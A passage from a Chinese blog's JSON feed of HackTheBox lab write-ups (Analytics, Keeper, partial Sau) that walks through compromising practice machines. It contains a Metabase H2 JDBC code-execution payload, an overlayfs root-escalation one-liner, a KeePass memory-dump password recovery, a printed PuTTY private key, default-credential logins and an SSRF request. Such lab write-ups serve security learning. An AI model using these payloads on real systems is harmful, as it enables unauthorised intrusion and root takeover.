null,</span><br><span class=\"line\">        &quot;refingerprint&quot;: false,</span><br><span class=\"line\">        &quot;auto_run_queries&quot;: true,</span><br><span class=\"line\">        &quot;schedules&quot;:</span><br><span class=\"line\">        &#123;&#125;,</span><br><span class=\"line\">        &quot;details&quot;:</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;bash /tmp/2.sh&#x27;)\\n$$--=x&quot;,</span><br><span class=\"line\">            &quot;advanced-options&quot;: false,</span><br><span class=\"line\">            &quot;ssl&quot;: true</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &quot;name&quot;: &quot;an-sec-research-team&quot;,</span><br><span class=\"line\">        &quot;engine&quot;: &quot;h2&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>反弹成功</p>\n<p>在使用 env 可以得到 metalytics 的账号与密码</p>\n<p>然后使用 ssh 进行登录</p>\n<p>metabase 里面没有什么内容</p>\n<p>ssh 连接后 id 显示 1000</p>\n<p>在目录下有一个 flag</p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>使用 sudo -l 发现没有用</p>\n<p>使用 uname</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure></p>\n<p>查资料发现存在</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CVE-2023-2640 and CVE-2023-32629</span><br></pre></td></tr></table></figure></p>\n<p>只需要使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c &#x27;import os;import pty;os.setuid(0);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>即可获取权限</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Keeper/",
            "url": "https://lookhui.github.io/HTB-Keeper/",
            "title": "HTB-Keeper",
            "date_published": "2023-12-14T03:01:05.000Z",
            "content_html": "<h1 id=\"keeper\"><a class=\"anchor\" href=\"#keeper\">#</a> Keeper</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>nmap 扫描</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 11:02 中国标准时间</span><br><span class=\"line\">Stats: 0:01:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class=\"line\">SYN Stealth Scan Timing: About 81.23% done; ETC: 11:04 (0:00:26 remaining)</span><br><span class=\"line\">Nmap scan report for tickets.keeper.htb (10.10.11.227)</span><br><span class=\"line\">Host is up (0.38s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 211.64 seconds</span><br></pre></td></tr></table></figure></p>\n<p>访问 ip 提示我没有令牌需要访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://tickets.keeper.htb/</span><br></pre></td></tr></table></figure></p>\n<p>添加 hosts</p>\n<p>进行目录扫描</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000835:   200        0 L      16 W       95 Ch       &quot;rtl&quot;</span><br><span class=\"line\">000001797:   200        0 L      16 W       95 Ch       &quot;rti&quot;</span><br><span class=\"line\">000001798:   200        0 L      16 W       95 Ch       &quot;rte&quot;</span><br><span class=\"line\">000002829:   403        0 L      0 W        0 Ch        &quot;l&quot;</span><br><span class=\"line\">000002830:   200        111 L    182 W      2309 Ch     &quot;m&quot;</span><br><span class=\"line\">000005145:   200        0 L      16 W       95 Ch       &quot;rt03&quot;</span><br><span class=\"line\">000005144:   200        0 L      16 W       95 Ch       &quot;rt234&quot;</span><br><span class=\"line\">000005143:   200        0 L      16 W       95 Ch       &quot;rtcase&quot;</span><br><span class=\"line\">000005141:   200        0 L      16 W       95 Ch       &quot;rtisv1&quot;</span><br><span class=\"line\">000005139:   200        0 L      16 W       95 Ch       &quot;rtl_img&quot;</span><br><span class=\"line\">000005142:   200        0 L      16 W       95 Ch       &quot;rthib1&quot;</span><br><span class=\"line\">000005140:   200        0 L      16 W       95 Ch       &quot;rtl_images&quot;</span><br><span class=\"line\">000018972:   200        0 L      16 W       95 Ch       &quot;rtpnc&quot;</span><br><span class=\"line\">000018984:   200        0 L      16 W       95 Ch       &quot;rt1&quot;</span><br><span class=\"line\">000018982:   200        0 L      16 W       95 Ch       &quot;rt3&quot;</span><br><span class=\"line\">000018981:   200        0 L      16 W       95 Ch       &quot;rt35&quot;</span><br><span class=\"line\">000018980:   200        0 L      16 W       95 Ch       &quot;rt4&quot;</span><br><span class=\"line\">000018979:   200        0 L      16 W       95 Ch       &quot;rt6&quot;</span><br><span class=\"line\">000018978:   200        0 L      16 W       95 Ch       &quot;rtech&quot;</span><br><span class=\"line\">000018977:   200        0 L      16 W       95 Ch       &quot;rtifs1&quot;</span><br><span class=\"line\">000018976:   200        0 L      16 W       95 Ch       &quot;rtifs2&quot;</span><br><span class=\"line\">000018974:   200        0 L      16 W       95 Ch       &quot;rtm.log&quot;</span><br><span class=\"line\">000018971:   200        0 L      16 W       95 Ch       &quot;rtr&quot;</span><br><span class=\"line\">000018973:   200        0 L      16 W       95 Ch       &quot;rtp&quot;</span><br><span class=\"line\">000018970:   200        0 L      16 W       95 Ch       &quot;rtr1&quot;</span><br><span class=\"line\">000018969:   200        0 L      16 W       95 Ch       &quot;rtr2&quot;</span><br><span class=\"line\">000018983:   200        0 L      16 W       95 Ch       &quot;rt25&quot;</span><br><span class=\"line\">000018968:   200        0 L      16 W       95 Ch       &quot;rts&quot;</span><br><span class=\"line\">000018967:   200        0 L      16 W       95 Ch       &quot;rtsc&quot;</span><br><span class=\"line\">000018966:   200        0 L      16 W       95 Ch       &quot;rtsmcse&quot;</span><br><span class=\"line\">000018965:   200        0 L      16 W       95 Ch       &quot;rtsp.php&quot;</span><br><span class=\"line\">000018964:   200        0 L      16 W       95 Ch       &quot;rtsxt1&quot;</span><br><span class=\"line\">000018975:   200        0 L      16 W       95 Ch       &quot;rtm&quot;</span><br><span class=\"line\">000018985:   200        153 L    325 W      4236 Ch     &quot;rt&quot;</span><br></pre></td></tr></table></figure></p>\n<p>发现 m 那里能进行登录直接进去</p>\n<p>跳转登录界面</p>\n<p>显示了 rt 4.4.4+dfsg-2ubuntu1 服务版本信息</p>\n<p>搜索默认密码尝试</p>\n<p>root/password</p>\n<p>登录成功</p>\n<p>收集信息</p>\n<p>发现用户除了 root 还有一个 lnorgaard</p>\n<p>并且在备注那里看到了密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">New user. Initial password set to Welcome2023!</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"获得shell\"><a class=\"anchor\" href=\"#获得shell\">#</a> 获得 shell</h4>\n<p>猜测这个密码是 ssh 连接密码进行连接查看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ ssh lnorgaard@10.10.11.227</span><br><span class=\"line\">The authenticity of host &#x27;10.10.11.227 (10.10.11.227)&#x27; can&#x27;t be established.</span><br><span class=\"line\">ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.</span><br><span class=\"line\">This key is not known by any other names.</span><br><span class=\"line\">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class=\"line\">Warning: Permanently added &#x27;10.10.11.227&#x27; (ED25519) to the list of known hosts.</span><br><span class=\"line\">lnorgaard@10.10.11.227&#x27;s password:</span><br><span class=\"line\">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)</span><br><span class=\"line\"></span><br><span class=\"line\"> * Documentation:  https://help.ubuntu.com</span><br><span class=\"line\"> * Management:     https://landscape.canonical.com</span><br><span class=\"line\"> * Support:        https://ubuntu.com/advantage</span><br><span class=\"line\">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class=\"line\"></span><br><span class=\"line\">You have mail.</span><br><span class=\"line\">Last login: Thu Dec 14 04:05:37 2023 from 10.10.14.19</span><br><span class=\"line\">lnorgaard@keeper:~$</span><br></pre></td></tr></table></figure></p>\n<p>登录成功</p>\n<p>在 user.txt 文件中拿下他的第一个 flag</p>\n<h4 id=\"提取\"><a class=\"anchor\" href=\"#提取\">#</a> 提取</h4>\n<p>发现 sudo 无法执行</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lnorgaard@keeper:~$ sudo -l</span><br><span class=\"line\">[sudo] password for lnorgaard:</span><br><span class=\"line\">Sorry, user lnorgaard may not run sudo on keeper.</span><br><span class=\"line\">lnorgaard@keeper:~$ sudo su</span><br><span class=\"line\">[sudo] password for lnorgaard:</span><br><span class=\"line\">lnorgaard is not in the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure></p>\n<p>解压目录下的压缩包</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lnorgaard@keeper:~$ unzip RT30000.zip -d ./cc</span><br><span class=\"line\">Archive:  RT30000.zip</span><br><span class=\"line\">  inflating: ./cc/KeePassDumpFull.dmp</span><br><span class=\"line\"> extracting: ./cc/passcodes.kdbx</span><br></pre></td></tr></table></figure></p>\n<p>出现了一个 kdbx 和一个 dmp 文件</p>\n<p>通过 scp 把 kdbx 和 dmp 以及 poc.py 都传到本地试试</p>\n<p>使用 python3 <span class=\"exturl\" data-url=\"aHR0cDovL3BvYy5weQ==\">poc.py</span> -d ./cc/KeePassDumpFull.dmp</p>\n<p>得到几长串字符通过后面一直没有变的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">med flode</span><br></pre></td></tr></table></figure></p>\n<p>使用谷歌搜索，搜索到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rødgrød med fløde</span><br></pre></td></tr></table></figure></p>\n<p>一种甜品名称</p>\n<p>使用 KeePass.exe 打开 KeePassDumpFull.dmp</p>\n<p>输入密码</p>\n<p>得到 notes</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PuTTY-User-Key-File-3: ssh-rsa</span><br><span class=\"line\">Encryption: none</span><br><span class=\"line\">Comment: rsa-key-20230519</span><br><span class=\"line\">Public-Lines: 6</span><br><span class=\"line\">AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D</span><br><span class=\"line\">8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T</span><br><span class=\"line\">EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM</span><br><span class=\"line\">Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu</span><br><span class=\"line\">FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ</span><br><span class=\"line\">LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et</span><br><span class=\"line\">Private-Lines: 14</span><br><span class=\"line\">AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j</span><br><span class=\"line\">oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih</span><br><span class=\"line\">kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY</span><br><span class=\"line\">f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT</span><br><span class=\"line\">VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz</span><br><span class=\"line\">UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs</span><br><span class=\"line\">OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz</span><br><span class=\"line\">in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r</span><br><span class=\"line\">SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV</span><br><span class=\"line\">09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa</span><br><span class=\"line\">xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA</span><br><span class=\"line\">AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD</span><br><span class=\"line\">AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy</span><br><span class=\"line\">NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=</span><br><span class=\"line\">Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0</span><br></pre></td></tr></table></figure></p>\n<p>将这个使用 puttygen 去转换为 id_rsa</p>\n<p>如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">puttygen keeper.ppk -O private-openssh -o id_rsa</span><br></pre></td></tr></table></figure></p>\n<p>得到后 chmod 777 id_rsa 给个权限</p>\n<p>使用 ssh -i id_rsa root@10.10.11.227 成功登录 root</p>\n<p>然后得到 flag2</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Sau/",
            "url": "https://lookhui.github.io/HTB-Sau/",
            "title": "HTB-Sau",
            "date_published": "2023-12-14T00:50:56.000Z",
            "content_html": "<h1 id=\"sau\"><a class=\"anchor\" href=\"#sau\">#</a> Sau</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>获得靶机 ip</p>\n<p>使用 nmap 扫描同时使用浏览器访问查看一下</p>\n<p>发现访问后没有出现内容</p>\n<p>nmap 扫描结束内容如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 08:52 中国标准时间</span><br><span class=\"line\">Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class=\"line\">SYN Stealth Scan Timing: About 72.40% done; ETC: 08:54 (0:00:32 remaining)</span><br><span class=\"line\">Nmap scan report for bogon (10.10.11.224)</span><br><span class=\"line\">Host is up (0.35s latency).</span><br><span class=\"line\">Not shown: 997 closed tcp ports (reset)</span><br><span class=\"line\">PORT      STATE    SERVICE</span><br><span class=\"line\">22/tcp    open     ssh</span><br><span class=\"line\">80/tcp    filtered http</span><br><span class=\"line\">55555/tcp open     unknown</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 112.22 seconds</span><br></pre></td></tr></table></figure></p>\n<p>这里的 80 端口显示被过滤了那我们使用 nmap -sF 来进行扫描这个端口看看</p>\n<p>tips: FIN 为 TCP 会话结束标志，在 FIN 扫描中一个设置了 FIN 位的数据包被发送后，若响应 RST 数据包，则表示端口关闭，没有响应则表示开放。此类扫描同样不能准确判断 windows 系统上端口开发情况，适合探测 Linux 系统上的端口开放情况</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Host is up (0.39s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT   STATE         SERVICE</span><br><span class=\"line\">80/tcp open|filtered http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 5.34 second</span><br></pre></td></tr></table></figure></p>\n<p>发现是打开的没问题</p>\n<p>然后访问开启的 55555 端口发现可以</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.10.11.224:55555/</span><br></pre></td></tr></table></figure></p>\n<p>使用详细扫描扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PORT      STATE    SERVICE VERSION</span><br><span class=\"line\">22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">80/tcp    filtered http</span><br><span class=\"line\">55555/tcp open     unknown</span><br><span class=\"line\">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class=\"line\">SF-Port55555-TCP:V=7.93%I=7%D=12/14%Time=657A52FF%P=i686-pc-windows-window</span><br><span class=\"line\">SF:s%r(GetRequest,A2,&quot;HTTP/1\\.0\\x20302\\x20Found\\r\\nContent-Type:\\x20text/h</span><br><span class=\"line\">SF:tml;\\x20charset=utf-8\\r\\nLocation:\\x20/web\\r\\nDate:\\x20Thu,\\x2014\\x20De</span><br><span class=\"line\">SF:c\\x202023\\x2000:57:37\\x20GMT\\r\\nContent-Length:\\x2027\\r\\n\\r\\n&lt;a\\x20href</span><br><span class=\"line\">SF:=\\&quot;/web\\&quot;&gt;Found&lt;/a&gt;\\.\\n\\n&quot;)%r(GenericLines,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\</span><br><span class=\"line\">SF:x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnecti</span><br><span class=\"line\">SF:on:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;)%r(HTTPOptions,60,&quot;HTTP/1\\.0</span><br><span class=\"line\">SF:\\x20200\\x20OK\\r\\nAllow:\\x20GET,\\x20OPTIONS\\r\\nDate:\\x20Thu,\\x2014\\x20De</span><br><span class=\"line\">SF:c\\x202023\\x2000:57:40\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(RTSPRe</span><br><span class=\"line\">SF:quest,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/p</span><br><span class=\"line\">SF:lain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Req</span><br><span class=\"line\">SF:uest&quot;)%r(Help,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x</span><br><span class=\"line\">SF:20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Ba</span><br><span class=\"line\">SF:d\\x20Request&quot;)%r(SSLSessionReq,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r</span><br><span class=\"line\">SF:\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close</span><br><span class=\"line\">SF:\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;)%r(TerminalServerCookie,67,&quot;HTTP/1\\.1\\x2</span><br><span class=\"line\">SF:0400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8</span><br><span class=\"line\">SF:\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;)%r(TLSSessionReq</span><br><span class=\"line\">SF:,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;</span><br><span class=\"line\">SF:\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;</span><br><span class=\"line\">SF:)%r(Kerberos,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x2</span><br><span class=\"line\">SF:0text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad</span><br><span class=\"line\">SF:\\x20Request&quot;)%r(FourOhFourRequest,EA,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Reques</span><br><span class=\"line\">SF:t\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-Op</span><br><span class=\"line\">SF:tions:\\x20nosniff\\r\\nDate:\\x20Thu,\\x2014\\x20Dec\\x202023\\x2000:58:14\\x20</span><br><span class=\"line\">SF:GMT\\r\\nContent-Length:\\x2075\\r\\n\\r\\ninvalid\\x20basket\\x20name;\\x20the\\x</span><br><span class=\"line\">SF:20name\\x20does\\x20not\\x20match\\x20pattern:\\x20\\^\\[\\\\w\\\\d\\\\-_\\\\\\.\\]&#123;1,25</span><br><span class=\"line\">SF:0&#125;\\$\\n&quot;)%r(LPDString,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-</span><br><span class=\"line\">SF:Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n40</span><br><span class=\"line\">SF:0\\x20Bad\\x20Request&quot;)%r(LDAPSearchReq,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Re</span><br><span class=\"line\">SF:quest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x</span><br><span class=\"line\">SF:20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;);</span><br><span class=\"line\">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></p>\n<p>访问 55555 端口发现提示貌似代理访问的东西，那很直接了 ssrf 直接设置访问 127.0.0.1:80 端口</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/baskets/add HTTP/1.1</span><br><span class=\"line\">Host: 10.10.11.224:55555</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 142</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;forward_url&quot;: 